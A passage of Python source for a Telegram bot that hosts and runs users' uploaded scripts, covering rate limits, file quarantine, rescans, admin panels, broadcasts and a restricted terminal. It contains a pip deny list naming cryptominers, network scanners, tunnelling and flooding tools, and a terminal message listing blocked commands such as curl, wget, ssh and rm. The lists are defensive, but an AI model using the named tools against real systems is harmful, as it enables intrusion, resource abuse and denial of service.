    sub   = user_subscriptions.get(user_id)
    limit = UPLOAD_RATE_PREMIUM if (sub and sub['expiry'] > now) else UPLOAD_RATE_FREE
    if len(times) >= limit:
        reset_in = int((times[0] - cutoff).total_seconds() / 60) + 1
        return False, (f"⏳ Upload rate limit reached ({limit}/hr).\n"
                       f"Try again in ~{reset_in} minute(s).")
    return True, ""

def _record_upload(user_id: int):
    """Call after a successful upload to record the timestamp."""
    _upload_timestamps.setdefault(user_id, []).append(datetime.now())

# ── Generic action rate limiter (terminal commands, pip installs, etc.) ────
_action_timestamps: dict = {}   # (user_id, action) -> [datetime, ...]
ACTION_RATE_LIMITS = {
    # action_key: (free_per_hour, premium_per_hour)
    'terminal_cmd': (60, 300),
    'pip_install':  (15, 60),
}
ACTION_RATE_WINDOW = 3600

def _check_action_rate(user_id: int, action: str) -> tuple[bool, str]:
    if user_id in admin_ids:
        return True, ""
    limits = ACTION_RATE_LIMITS.get(action)
    if not limits:
        return True, ""
    free_limit, premium_limit = limits
    now    = datetime.now()
    cutoff = now - timedelta(seconds=ACTION_RATE_WINDOW)
    key    = (user_id, action)
    times  = [t for t in _action_timestamps.get(key, []) if t > cutoff]
    _action_timestamps[key] = times

    sub   = user_subscriptions.get(user_id)
    limit = premium_limit if (sub and sub['expiry'] > now) else free_limit
    if len(times) >= limit:
        reset_in = int((times[0] - cutoff).total_seconds() / 60) + 1
        return False, f"⏳ Rate limit reached ({limit}/hr for this action). Try again in ~{reset_in} min."
    return True, ""

def _record_action(user_id: int, action: str):
    _action_timestamps.setdefault((user_id, action), []).append(datetime.now())

# ── Pip install allow/deny list ─────────────────────────────────────────────
# Packages known for abuse potential (mining, scanning, flooding, etc.) — blocked host-wide.
BLOCKED_PIP_PACKAGES = {
    'nicehash', 'cpuminer', 'xmrig', 'minerstat', 'cryptominer',
    'scapy', 'nmap-python', 'python-nmap', 'shodan',
    'pyngrok', 'ngrok',
    'zmap', 'masscan',
    'slowloris', 'loic',
}

def _is_pip_package_blocked(package_spec: str) -> bool:
    """Checks the bare package name (ignoring version pins) against the deny list."""
    name = re.split(r'[=<>!~\[; ]', package_spec.strip())[0].strip().lower()
    return name in BLOCKED_PIP_PACKAGES

# ── Upgrade 5: Quarantine list ────────────────────────────────────────────────

def get_all_banned_files():
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute('''SELECT user_id, file_name, file_type, ban_reason, review_time
                         FROM file_approvals WHERE status=?
                         ORDER BY review_time DESC''', (FILE_STATUS_BANNED,))
            return c.fetchall()
        except Exception as e:
            logger.error(f"get_all_banned_files: {e}")
            return []
        finally:
            conn.close()

def _send_quarantine_list(chat_id):
    banned = get_all_banned_files()
    if not banned:
        mk = types.InlineKeyboardMarkup()
        mk.add(_btn("🔙 Back", "gray", "back_to_main"))
        bot.send_message(chat_id, "✅ Quarantine is empty — no banned files.", reply_markup=mk)
        return

    mk    = types.InlineKeyboardMarkup(row_width=1)
    lines = [f"🔒 <b>Quarantine — {len(banned)} banned file(s)</b>\n"
             f"<i>Review each one and override or delete.</i>\n"]
    for idx, (uid, fname, ftype, reason, rtime) in enumerate(banned[:20], 1):
        short_reason = (reason or "No reason")[:60]
        try:
            dt  = datetime.fromisoformat(rtime).strftime('%m-%d %H:%M') if rtime else "?"
        except Exception:
            dt = "?"
        lines.append(
            f"{idx}. 👤 <code>{uid}</code>  📄 <code>{fname}</code> [{ftype.upper() if ftype else '?'}]\n"
            f"    ⚠️ {_esc(short_reason)}  🕐 {dt}"
        )
        mk.row(
            types.InlineKeyboardButton(
                f"✅ Approve: {fname[:20]}",
                callback_data=_cb('scanoverride_', uid, fname)
            ),
            types.InlineKeyboardButton(
                f"🗑️ Delete: {fname[:20]}",
                callback_data=_cb('scandelete_', uid, fname)
            ),
        )
    if len(banned) > 20:
        lines.append(f"\n…and {len(banned) - 20} more.")
    mk.row(
        _btn("🔄 Refresh", "primary", "quarantine"),
        _btn("🔙 Back",    "gray",    "back_to_main"),
    )
    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3900] + "\n…(truncated)"
    bot.send_message(chat_id, text, reply_markup=mk, parse_mode='HTML')

# ── Upgrade 1: Per-rule severity config ──────────────────────────────────────

def _all_scan_rule_labels() -> list:
    """Return all rule labels (block + warn) in order."""
    labels = [(lbl, 'block') for _, lbl in _SCAN_RULES]
    labels += [(lbl, 'warn')  for _, lbl in _SCAN_WARN_RULES]
    return labels

def _save_disabled_scan_labels():
    import json as _jsl
    save_setting('disabled_scan_labels', _jsl.dumps(list(_disabled_scan_labels)))

def _send_scan_rules_panel(chat_id, page: int = 0):
    all_rules = _all_scan_rule_labels()
    PAGE_SIZE = 8
    start = page * PAGE_SIZE
    chunk = all_rules[start:start + PAGE_SIZE]
    total_pages = (len(all_rules) + PAGE_SIZE - 1) // PAGE_SIZE

    lines = [f"🔧 <b>Scan Rules Config</b>  (page {page+1}/{total_pages})\n"
             f"<i>Toggle rules ON/OFF. Disabled rules are skipped during scanning.</i>\n"]
    mk = types.InlineKeyboardMarkup(row_width=1)
    for i, (lbl, severity) in enumerate(chunk):
        global_idx = start + i
        enabled    = lbl not in _disabled_scan_labels
        icon       = "✅" if enabled else "❌"
        sev_badge  = "🔴" if severity == 'block' else "🟡"
        short      = lbl[:45] + ("…" if len(lbl) > 45 else "")
        mk.add(types.InlineKeyboardButton(
            f"{icon} {sev_badge} {short}",
            callback_data=f"scanrule_toggle_{global_idx}"
        ))
        lines.append(f"{icon} {sev_badge} <code>{_esc(lbl[:60])}</code>")

    nav = []
    if page > 0:
        nav.append(_btn("◀ Prev", "primary", f"scanrules_page_{page-1}"))
    if (page + 1) < total_pages:
        nav.append(_btn("Next ▶", "primary", f"scanrules_page_{page+1}"))
    if nav:
        mk.row(*nav)
    mk.add(_btn("🔙 Back to Admin Panel", "gray", "admin_panel"))

    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3900] + "\n…"
    bot.send_message(chat_id, text, reply_markup=mk, parse_mode='HTML')

# ── Upgrade 2: /rescan command ────────────────────────────────────────────────

def _logic_rescan(message):
    """Admin command: /rescan USER_ID FILENAME — re-runs scanner on an uploaded file."""
    if message.from_user.id not in admin_ids:
        bot.reply_to(message, "⛔ Admin only.")
        return
    parts = (message.text or "").split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message,
            "Usage: <code>/rescan USER_ID FILENAME</code>\n"
            "Example: <code>/rescan 123456789 mybot.py</code>",
            parse_mode='HTML')
        return
    try:
        uid   = int(parts[1])
        fname = os.path.basename(parts[2].strip())
    except (ValueError, IndexError):
        bot.reply_to(message, "❌ Invalid USER_ID or filename.")
        return

    folder = get_user_folder(uid)
    fpath  = os.path.join(folder, fname)
    if not os.path.exists(fpath):
        bot.reply_to(message, f"❌ File <code>{_esc(fname)}</code> not found on disk for user <code>{uid}</code>.",
                     parse_mode='HTML')
        return

    code = _read_script_content(fpath)
    if not code:
        bot.reply_to(message, "❌ Could not read file content.")
        return

    result = scan_script_for_threats(code, fname)
    report = _format_scan_result(result, fname)

    mk = types.InlineKeyboardMarkup(row_width=2)
    if result['blocked']:
        mk.add(
            _btn("✅ Override & Approve", "success", _cb('scanoverride_', uid, fname)),
            _btn("🗑️ Delete & Ban",       "danger",  _cb('scandelete_',  uid, fname)),
        )
    else:
        mk.add(
            _btn("✅ Approve File", "success", _cb('approve_', uid, fname)),
            _btn("🔨 Ban File",     "danger",  _cb('ban_',     uid, fname)),
        )

    bot.reply_to(
        message,
        f"🔍 <b>Rescan Result</b>\n\n"
        f"👤 User: <code>{uid}</code>  📄 <code>{_esc(fname)}</code>\n\n"
        f"{report}",
        reply_markup=mk, parse_mode='HTML'
    )

# ── Upgrade 6: File diff on re-upload ────────────────────────────────────────

def _compute_diff(old_content: str, new_content: str, fname: str) -> str:
    """Return a short unified diff (first 40 lines) between old and new file content."""
    import difflib
    old_lines = old_content.splitlines(keepends=True)
    new_lines = new_content.splitlines(keepends=True)
    diff = list(difflib.unified_diff(
        old_lines, new_lines,
        fromfile=f"old/{fname}", tofile=f"new/{fname}", n=2
    ))
    if not diff:
        return "(no textual differences)"
    snippet = "".join(diff[:40])
    if len(diff) > 40:
        snippet += f"\n…({len(diff) - 40} more diff lines)"
    return snippet

def _logic_send_welcome(message):
    user_id   = message.from_user.id
    chat_id   = message.chat.id
    fname     = message.from_user.first_name
    uname     = message.from_user.username

    if bot_locked and user_id not in admin_ids:
        bot.send_message(chat_id, "🔒 Bot is locked by admin. Try again later.")
        return

    if user_id not in active_users:
        add_active_user(user_id)
        try:
            bot.send_message(
                OWNER_ID,
                f"🆕 <b>New User</b>\n"
                f"👤 {fname}  @{uname or 'N/A'}\n"
                f"🆔 <code>{user_id}</code>",
                parse_mode='HTML'
            )
        except Exception:
            pass

    text = _build_welcome_text(user_id, fname, uname)
    bot.send_message(chat_id, text, reply_markup=create_main_menu(user_id), parse_mode='HTML')

def _logic_upload_file(message):
    user_id = message.from_user.id
    if bot_locked and user_id not in admin_ids:
        bot.reply_to(message, "🔒 Bot is locked.")
        return
    limit   = get_user_file_limit(user_id)
    current = get_user_file_count(user_id)
    lim_str = "∞" if limit == float('inf') else str(limit)
    if current >= limit:
        bot.reply_to(message, f"📁 File limit reached ({current}/{lim_str}). Delete a file first.")
        return
    bot.reply_to(
        message,
        "📤 <b>Upload your script</b>\n\n"
        "Supported: <code>.py</code> · <code>.js</code> · <code>.zip</code>\n\n"
        "<i>Files are <b>auto-approved</b> and ready to run immediately!</i>",
        parse_mode='HTML'
    )

def _logic_check_files(message, filter_text: str = ''):
    user_id    = message.from_user.id
    files_list = user_files.get(user_id, [])
    if filter_text:
        files_list = [(n, t) for n, t in files_list if filter_text.lower() in n.lower()]
    if not files_list:
        msg = ("🔍 No files match your search." if filter_text else
               "📂 <b>No files yet</b>\n\nUpload a <code>.py</code>, <code>.js</code>, or <code>.zip</code> to get started.")
        mk = types.InlineKeyboardMarkup()
        if filter_text:
            mk.add(_btn("🔙 Show All Files", "gray", "check_files"))
        else:
            mk.add(
                _btn("📁 New Folder",    "success", "newdir_ask"),
                _btn("🗑️ Delete Folder", "danger",  "deldir_ask"),
            )
            mk.add(_btn("📂 My Dirs", "primary", "mydirs_view"))
            mk.add(_btn("🔙 Back", "gray", "back_to_main"))
        bot.reply_to(message, msg, parse_mode='HTML', reply_markup=mk)
        return

    mk    = types.InlineKeyboardMarkup(row_width=1)
    lines = []
    for file_name, file_type in sorted(files_list):
        running  = is_bot_running(user_id, file_name)
        fs       = get_file_status(user_id, file_name)
        a_icon   = _approval_icon(fs['status'])
        r_icon   = "🟢" if running else "⚫"
        mk.add(types.InlineKeyboardButton(
            f"{a_icon} {file_name} [{file_type.upper()}] {r_icon}",
            callback_data=_cb('file_', user_id, file_name)
        ))
        lines.append(f"{a_icon} <code>{file_name}</code> · {file_type.upper()} · {'Running' if running else 'Stopped'}")

    if len(user_files.get(user_id, [])) > 5:
        mk.add(_btn("🔍 Search Files", "primary", "search_files"))
    mk.add(
        _btn("📁 New Folder",    "success", "newdir_ask"),
        _btn("🗑️ Delete Folder", "danger",  "deldir_ask"),
    )
    mk.add(_btn("📂 My Dirs", "primary", "mydirs_view"))
    mk.add(_btn("🔙 Back", "gray", "back_to_main"))
    title = f"🔍 <b>Search results for “{_esc(filter_text)}” ({len(files_list)})</b>" if filter_text \
            else f"📂 <b>Your Files ({len(files_list)})</b>"
    bot.reply_to(
        message,
        title + "\n\n" + "\n".join(lines),
        reply_markup=mk, parse_mode='HTML'
    )

def _send_mydirs(chat_id, user_id):
    existing = _list_user_dirs(user_id)
    mk = types.InlineKeyboardMarkup(row_width=1)
    if len(existing) < MAX_USER_DIRS:
        mk.add(_btn("📁 New Folder", "success", "newdir_ask"))
    if existing:
        mk.add(_btn("🗑️ Delete Folder", "danger", "deldir_ask"))
    mk.add(_btn("🔙 Back", "gray", "check_files"))
    bot.send_message(
        chat_id,
        f"📂 <b>Your folders</b> ({len(existing)}/{MAX_USER_DIRS}):\n"
        + ("\n".join(f"📁 {_esc(d)}/" for d in existing) if existing else "(none yet — tap below to create one)"),
        parse_mode='HTML',
        reply_markup=mk
    )

def _process_newdir(message):
    if (message.text or "").strip().lower() == '/cancel':
        bot.reply_to(message, "Cancelled."); return
    uid = message.from_user.id
    ok, msg = create_user_directory(uid, message.text)
    if ok:
        log_audit(uid, 'create_folder', message.text.strip())
    bot.reply_to(message, msg, parse_mode='HTML')

def _send_deldir_menu(chat_id, user_id):
    existing = _list_user_dirs(user_id)
    if not existing:
        bot.send_message(chat_id, "📂 You don't have any folders to delete.", parse_mode='HTML')
        return
    mk = types.InlineKeyboardMarkup(row_width=1)
    for d in existing:
        mk.add(_btn(f"🗑️ {d}", "danger", f"deldirpick_{d}"))
    mk.add(_btn("🔙 Back", "gray", "check_files"))
    bot.send_message(chat_id, "🗑️ <b>Select a folder to delete:</b>", parse_mode='HTML', reply_markup=mk)

def _confirm_deldir(chat_id, user_id, dirname):
    mk = types.InlineKeyboardMarkup()
    mk.row(
        _btn("✅ Yes, delete", "danger", f"deldirconfirm_{dirname}"),
        _btn("❌ Cancel",      "gray",   "check_files"),
    )
    bot.send_message(
        chat_id,
        f"⚠️ Delete folder <code>{_esc(dirname)}</code> and <b>everything inside it</b>? This can't be undone.",
        parse_mode='HTML', reply_markup=mk
    )

def _process_search_files(message):
    query = (message.text or "").strip()
    if query.lower() == '/cancel':
        bot.reply_to(message, "Cancelled."); return
    _logic_check_files(message, filter_text=query)

def _logic_view_pending(message):
    if message.from_user.id not in admin_ids:
        bot.reply_to(message, "⛔ Admin only.")
        return
    _send_pending_list(message.chat.id)

def _send_pending_list(chat_id):
    pending = get_all_pending_files()
    if not pending:
        bot.send_message(chat_id, "✅ No pending files right now.")
        return

    mk    = types.InlineKeyboardMarkup(row_width=1)
    lines = [f"🔔 <b>Pending Files — {len(pending)}</b>\n"]
    for idx, (uid, fname, ftype, utime) in enumerate(pending[:20], 1):
        try:
            dt   = datetime.fromisoformat(utime)
            mins = int((datetime.now() - dt).total_seconds() / 60)
            age  = f"{mins}m ago" if mins < 60 else f"{mins // 60}h ago"
        except Exception:
            age = "?"
        lines.append(f"{idx}. <code>{fname}</code> · {ftype.upper()} · <code>{uid}</code> · {age}")
        mk.add(types.InlineKeyboardButton(
            f"🟡 👁️ Review: {fname}  ({uid})",
            callback_data=_cb('review_', uid, fname)
        ))
    if len(pending) > 20:
        lines.append(f"\n…and {len(pending) - 20} more.")

    mk.row(
        _btn("🔄 Refresh", "primary", "view_pending"),
        _btn("🔙 Back",    "gray",    "back_to_main"),
    )
    bot.send_message(chat_id, "\n".join(lines), reply_markup=mk, parse_mode='HTML')

def _send_approved_list(chat_id):
    approved = get_all_approved_files()
    if not approved:
        mk = types.InlineKeyboardMarkup()
        mk.row(
            _btn("🔄 Refresh", "primary", "view_approved"),
            _btn("🔙 Back",    "gray",    "back_to_main"),
        )
        bot.send_message(chat_id, "✅ No approved files found.", reply_markup=mk)
        return

    mk    = types.InlineKeyboardMarkup(row_width=1)
    lines = [f"🔍 <b>Verify Files — {len(approved)} approved</b>\n"
             f"<i>Review running files. Ban any suspicious ones.</i>\n"]
    for idx, (uid, fname, ftype, utime) in enumerate(approved[:20], 1):
        running = is_bot_running(uid, fname)
        r_icon  = "🟢 Running" if running else "⚫ Stopped"
        try:
            dt  = datetime.fromisoformat(utime)
            age = dt.strftime('%m-%d %H:%M')
        except Exception:
            age = "?"
        lines.append(f"{idx}. 👤 <code>{uid}</code>  📄 <code>{fname}</code> [{ftype.upper()}]\n"
                     f"    {r_icon} · Uploaded: {age}")
        mk.add(types.InlineKeyboardButton(
            f"🔍 {fname} (uid:{uid}) {r_icon}",
            callback_data=_cb('verify_', uid, fname)
        ))
    if len(approved) > 20:
        lines.append(f"\n…and {len(approved) - 20} more.")

    mk.row(
        _btn("🔄 Refresh", "primary", "view_approved"),
        _btn("🔙 Back",    "gray",    "back_to_main"),
    )
    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3900] + "\n…(truncated)"
    bot.send_message(chat_id, text, reply_markup=mk, parse_mode='HTML')

def _logic_bot_speed(message):
    start = time.time()
    msg   = bot.reply_to(message, "⚡ Measuring…")
    rt    = round((time.time() - start) * 1000, 2)
    lock  = "🔒 Locked" if bot_locked else "🟢 Online"
    text  = (
        f"⚡ <b>Speed Check</b>\n\n"
        f"📡 Response: <code>{rt} ms</code>\n"
        f"🤖 Status: {lock}\n"
        f"🏅 Your rank: {_user_status_label(message.from_user.id)}\n"
        f"⏱️ Uptime: <code>{get_uptime()}</code>"
    )
    if message.from_user.id in admin_ids:
        text += f"\n🔔 Pending: <code>{get_pending_files_count()}</code>"
    bot.edit_message_text(text, message.chat.id, msg.message_id, parse_mode='HTML')

def _dir_size(path: str) -> int:
    """Total size in bytes of everything under `path` (best-effort, ignores errors)."""
    total = 0
    if not os.path.exists(path):
        return 0
    for root, dirs, files in os.walk(path):
        for f in files:
            try:
                total += os.path.getsize(os.path.join(root, f))
            except OSError:
                pass
    return total

def _human_size(num_bytes: int) -> str:
    size = float(num_bytes)
    for unit in ('B', 'KB', 'MB', 'GB'):
        if size < 1024:
            return f"{size:.1f}{unit}"
        size /= 1024
    return f"{size:.1f}TB"

def _find_idle_venvs(days: int = 30):
    """Scans all user folders for .venv directories not modified in `days` days."""
    cutoff = time.time() - days * 86400
    idle = []
    if not os.path.exists(UPLOAD_BOTS_DIR):
        return idle
    for uid_folder in os.listdir(UPLOAD_BOTS_DIR):
        venv_path = os.path.join(UPLOAD_BOTS_DIR, uid_folder, '.venv')
        if os.path.isdir(venv_path):
            try:
                mtime = os.path.getmtime(venv_path)
                if mtime < cutoff:
                    size = _dir_size(venv_path)
                    idle.append((uid_folder, mtime, size))
            except OSError:
                continue
    idle.sort(key=lambda x: x[1])   # oldest first
    return idle

def _logic_statistics(message):
    user_id       = message.from_user.id
    total_users   = len(active_users)
    total_files   = sum(len(v) for v in user_files.values())
    running_count = sum(
        1 for key, info in list(bot_scripts.items())
        if is_bot_running(info['script_owner_id'], info['file_name'])
    )
    user_running = sum(
        1 for key in list(bot_scripts)
        if key.startswith(f"{user_id}_") and is_bot_running(user_id, bot_scripts[key]['file_name'])
    )

    folder      = get_user_folder(user_id)
    venv_path   = os.path.join(folder, '.venv')
    venv_size   = _dir_size(venv_path)
    files_size  = _dir_size(folder) - venv_size

    text = (
        f"📊 <b>Statistics</b>\n\n"
        f"👥 Total Users:    <code>{total_users}</code>\n"
        f"📁 Total Files:    <code>{total_files}</code>\n"
        f"🟢 Running Scripts: <code>{running_count}</code>\n"
        f"🖥️ Your Running:   <code>{user_running}</code>\n"
        f"⏱️ Uptime:         <code>{get_uptime()}</code>\n\n"
        f"💾 <b>Your Disk Usage</b>\n"
        f"📄 Files:  <code>{_human_size(max(files_size, 0))}</code>\n"
        f"🐍 Venv:   <code>{_human_size(venv_size)}</code>"
    )
    if user_id in admin_ids:
        text += (
            f"\n\n━━━━━ Admin Info ━━━━━\n"
            f"🔒 Bot locked: {'Yes' if bot_locked else 'No'}\n"
            f"🔔 Pending:    <code>{get_pending_files_count()}</code>\n"
            f"🛡️ Admins:     <code>{len(admin_ids)}</code>\n"
            f"💎 Subscribers: <code>{len(user_subscriptions)}</code>"
        )
    bot.reply_to(message, text, parse_mode='HTML')

def _logic_sister_bots(msg_or_call):
    if isinstance(msg_or_call, types.CallbackQuery):
        chat_id = msg_or_call.message.chat.id
        mid     = msg_or_call.message.message_id
        bot.answer_callback_query(msg_or_call.id)
        send_fn = lambda t, **kw: bot.edit_message_text(t, chat_id, mid, **kw)
    else:
        send_fn = lambda t, **kw: bot.reply_to(msg_or_call, t, **kw)

    mk    = types.InlineKeyboardMarkup(row_width=1)
    lines = ["🤝 <b>Sister Bots</b>\n"]
    for sb in SISTER_BOTS:
        lines.append(f"• <b>{sb['name']}</b> — <i>{sb['desc']}</i>\n  @{sb['username']}")
        mk.add(_btn_url(sb['name'], "primary", f"https://t.me/{sb['username']}"))
    mk.add(_btn("🔙 Back", "gray", "back_to_main"))
    send_fn("\n".join(lines), reply_markup=mk, parse_mode='HTML')

def _logic_backup_db(call_or_msg):
    if isinstance(call_or_msg, types.CallbackQuery):
        uid   = call_or_msg.from_user.id
        reply = lambda t, **kw: bot.send_message(call_or_msg.message.chat.id, t, **kw)
        bot.answer_callback_query(call_or_msg.id)
    else:
        uid   = call_or_msg.from_user.id
        reply = lambda t, **kw: bot.reply_to(call_or_msg, t, **kw)

    if uid not in admin_ids:
        reply("⛔ Admin only.")
        return

    rows = get_backup_files()
    if not rows:
        reply("🗄️ Backup DB is empty.")
        return

    by_user = {}
    for uid_k, fname, ftype, utime in rows:
        by_user.setdefault(uid_k, []).append((fname, ftype, utime))

    lines = [f"🗄️ <b>Backup DB — {len(rows)} files</b>\n"]
    for uid_k, files in sorted(by_user.items()):
        lines.append(f"\n👤 <code>{uid_k}</code> ({len(files)} files):")
        for fname, ftype, utime in files:
            try:
                dt = datetime.fromisoformat(utime).strftime('%Y-%m-%d')
            except Exception:
                dt = "?"
            lines.append(f"  📄 <code>{fname}</code> · {ftype.upper()} · {dt}")

    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3900] + "\n…(truncated)"
    mk = types.InlineKeyboardMarkup()
    mk.add(_btn("🔙 Back", "gray", "back_to_main"))
    reply(text, reply_markup=mk, parse_mode='HTML')

def _logic_run_all_scripts(msg_or_call):
    if isinstance(msg_or_call, types.CallbackQuery):
        admin_uid = msg_or_call.from_user.id
        bot.answer_callback_query(msg_or_call.id)
        reply  = lambda t, **kw: bot.send_message(msg_or_call.message.chat.id, t, **kw)
        msg_obj = msg_or_call.message
    else:
        admin_uid = msg_or_call.from_user.id
        reply    = lambda t, **kw: bot.reply_to(msg_or_call, t, **kw)
        msg_obj  = msg_or_call

    if admin_uid not in admin_ids:
        reply("⛔ Admin only.")
        return

    reply("🚀 Starting all approved scripts…")
    started = skipped = 0
    errors  = []

    for target_id, files in dict(user_files).items():
        for fname, ftype in files:
            fs = get_file_status(target_id, fname)
            if fs['status'] != FILE_STATUS_APPROVED:
                skipped += 1
                errors.append(f"<code>{fname}</code> (user <code>{target_id}</code>) — {fs['status']}")
                continue
            if is_bot_running(target_id, fname):
                skipped += 1
                continue
            folder = get_user_folder(target_id)
            path   = os.path.join(folder, fname)
            if not os.path.exists(path):
                errors.append(f"<code>{fname}</code> — missing on disk")
                skipped += 1
                continue
            try:
                runner = run_script if ftype == 'py' else run_js_script
                threading.Thread(target=runner, args=(path, target_id, folder, fname, msg_obj)).start()
                started += 1
                time.sleep(0.5)
            except Exception as e:
                errors.append(f"<code>{fname}</code> error: {e}")
                skipped += 1

    summary = f"✅ <b>Done!</b>\n\n🟢 Started: <code>{started}</code>\n⚪ Skipped: <code>{skipped}</code>"
    if errors:
        summary += "\n\n<b>Details:</b>\n" + "\n".join(f"• {e}" for e in errors[:5])
    reply(summary, parse_mode='HTML')

def _logic_broadcast_init(message):
    if message.from_user.id not in admin_ids:
        bot.reply_to(message, "⛔ Admin only.")
        return
    mk = types.InlineKeyboardMarkup()
    mk.row(
        _btn("📝 Text Broadcast",  "primary", "broadcast_text"),
        _btn("🖼️ Photo Broadcast", "success", "broadcast_photo"),
    )
    mk.add(_btn("🔙 Back", "gray", "back_to_main"))
    bot.reply_to(
        message,
        f"📣 <b>Broadcast Center</b>\n\n"
        f"👥 Users: <code>{len(active_users)}</code>\n\n"
        f"Choose broadcast type:",
        reply_markup=mk, parse_mode='HTML'
    )

def _logic_toggle_auto_approve(caller_id, chat_id):
    global auto_approve_enabled
    if caller_id not in admin_ids:
        bot.send_message(chat_id, "⛔ Admin only.")
        return
    auto_approve_enabled = not auto_approve_enabled
    save_setting('auto_approve_enabled', 'true' if auto_approve_enabled else 'false')
    state = "✅ ON" if auto_approve_enabled else "❌ OFF"
    bot.send_message(
        chat_id,
        f"🔄 <b>Auto-Approval Toggled</b>\n\n"
        f"Status: <b>{state}</b>\n"
        f"<i>Setting saved — will survive bot restart.</i>\n\n"
        f"{'Files will be auto-approved on upload.' if auto_approve_enabled else 'Files will require manual admin approval before running.'}",
        parse_mode='HTML'
    )

def _logic_toggle_daily_msg(caller_id, chat_id):
    global daily_msg_enabled
    if caller_id not in admin_ids:
        bot.send_message(chat_id, "⛔ Admin only.")
        return
    daily_msg_enabled = not daily_msg_enabled
    state = "✅ ON" if daily_msg_enabled else "❌ OFF"
    bot.send_message(
        chat_id,
        f"💬 <b>Daily Messages Toggled</b>\n\n"
        f"Status: <b>{state}</b>\n\n"
        f"{'Users will receive 4-5 random messages per day.' if daily_msg_enabled else 'Daily messages are now disabled.'}",
        parse_mode='HTML'
    )

def _logic_toggle_hourly_backup(caller_id, chat_id):
    global hourly_backup_enabled
    if caller_id not in admin_ids:
        bot.send_message(chat_id, "⛔ Admin only.")
        return
    hourly_backup_enabled = not hourly_backup_enabled
    save_setting('hourly_backup_enabled', 'true' if hourly_backup_enabled else 'false')
    state = "✅ ON" if hourly_backup_enabled else "❌ OFF"
    bot.send_message(
        chat_id,
        f"🗄️ <b>Telegram Auto-Backup Toggled</b>\n\n"
        f"Status: <b>{state}</b>\n"
        f"<i>Setting saved — will survive bot restart.</i>\n\n"
        f"{'Hourly DB backups will be sent to owner/admins via Telegram.' if hourly_backup_enabled else 'Hourly auto-backup sending is now paused. Manual 📤 Send Backup Now still works.'}",
        parse_mode='HTML'
    )

def _logic_toggle_lock(message):
    if message.from_user.id not in admin_ids:
        bot.reply_to(message, "⛔ Admin only.")
        return
    global bot_locked
    bot_locked = not bot_locked
    state = "🔒 Locked" if bot_locked else "🔓 Unlocked"
    bot.reply_to(message, f"Bot is now <b>{state}</b>.", parse_mode='HTML')

def _logic_admin_panel(message):
    if message.from_user.id not in admin_ids:
        bot.reply_to(message, "⛔ Admin only.")
        return
    bot.reply_to(message, "👑 <b>Admin Panel</b>", reply_markup=create_admin_panel_markup(), parse_mode='HTML')

def _logic_open_terminal(chat_id, user_id):
    terminal_sessions[user_id] = {'chat_id': chat_id, 'active': True}
    prompt = bot.send_message(
        chat_id,
        "💻 <b>Sandboxed Terminal Session Started</b>\n\n"
        "┌─────────────────────────\n"
        "│ Type commands below — output streams back live ✨\n"
        "│ Type <code>exit</code> to close.\n"
        "└─────────────────────────\n\n"
        "✅ <b>Allowed commands:</b>\n"
        "<code>python</code> · <code>pip</code> · <code>node</code> · <code>npm</code>\n"
        "<code>cat</code> · <code>ls</code> · <code>head</code> · <code>tail</code>\n"
        "<code>grep</code> · <code>echo</code> · <code>find</code> · <code>wc</code>\n"
        "<code>env</code> · <code>ps</code> · <code>df</code> · <code>free</code> · <code>uptime</code>\n\n"
        "🚫 <b>Blocked (server safety):</b> <code>rm</code> · <code>mv</code> · <code>cp</code> · "
        "<code>curl</code> · <code>wget</code> · <code>ssh</code> · <code>scp</code> · "
        "<code>bash</code> · <code>sh</code> · <code>neofetch</code> · <code>sudo</code> · "
        "<code>kill</code> · <code>chmod</code> + more\n\n"
        "⚡ <b>Ready — enter your command:</b>",
        parse_mode='HTML',
        reply_markup=create_terminal_menu()
    )
    bot.register_next_step_handler(prompt, _handle_terminal_input)

def process_broadcast_message(message):
    if message.from_user.id not in admin_ids:
        return
    if message.text and message.text.lower() == '/cancel':
        bot.reply_to(message, "Broadcast cancelled.")
        return
    if not message.text and not (message.photo or message.video):
        msg = bot.send_message(message.chat.id, "Send text/media or /cancel.")
        bot.register_next_step_handler(msg, process_broadcast_message)
        return
    mk = types.InlineKeyboardMarkup()
    mk.row(
        _btn("✅ Confirm", "success", f"confirm_broadcast_{message.message_id}"),
        _btn("❌ Cancel",  "danger",  "cancel_broadcast"),
    )
    preview = message.text[:300] if message.text else "(Media message)"
    bot.reply_to(
        message,
        f"📣 Broadcast to <b>{len(active_users)}</b> users?\n\n<pre>{preview}</pre>",
        reply_markup=mk, parse_mode='HTML'
    )

def process_text_broadcast(message):
    if message.from_user.id not in admin_ids:
        return
    if message.text and message.text.lower() == '/cancel':
        bot.reply_to(message, "Broadcast cancelled."); return
    if not message.text:
        msg = bot.reply_to(message, "Send a text message or /cancel.")
        bot.register_next_step_handler(msg, process_text_broadcast); return
    mk = types.InlineKeyboardMarkup()
    mk.row(
        _btn("✅ Send to All", "success", f"confirm_broadcast_{message.message_id}"),
        _btn("❌ Cancel",      "danger",  "cancel_broadcast"),
    )
    bot.reply_to(
        message,
        f"📝 <b>Text Broadcast Preview</b>\n\n"
        f"👥 Sending to <b>{len(active_users)}</b> users:\n\n"
        f"<pre>{_esc(message.text[:300])}</pre>",
        reply_markup=mk, parse_mode='HTML'
    )

def process_photo_broadcast(message):
    if message.from_user.id not in admin_ids:
        return
    if message.text and message.text.lower() == '/cancel':
        bot.reply_to(message, "Broadcast cancelled."); return
    if not message.photo:
        msg = bot.reply_to(
            message,
            "📷 Please send a <b>photo</b> (with optional caption) or /cancel.",
            parse_mode='HTML'
        )
        bot.register_next_step_handler(msg, process_photo_broadcast); return

    mk = types.InlineKeyboardMarkup()
    mk.row(
        _btn("✅ Send Photo to All", "success", f"confirm_broadcast_{message.message_id}"),
        _btn("❌ Cancel",            "danger",  "cancel_broadcast"),
    )
    caption_preview = message.caption[:200] if message.caption else "(no caption)"
    bot.reply_to(
        message,
        f"🖼️ <b>Photo Broadcast Preview</b>\n\n"
        f"👥 Sending to <b>{len(active_users)}</b> users:\n"
        f"📝 Caption: <i>{_esc(caption_preview)}</i>",
        reply_markup=mk, parse_mode='HTML'
    )

def execute_broadcast(text, photo_id, video_id, caption, admin_chat_id):
    sent = failed = blocked = 0
    for i, uid in enumerate(list(active_users)):
        try:
            if text:
                bot.send_message(uid, text, parse_mode='HTML')
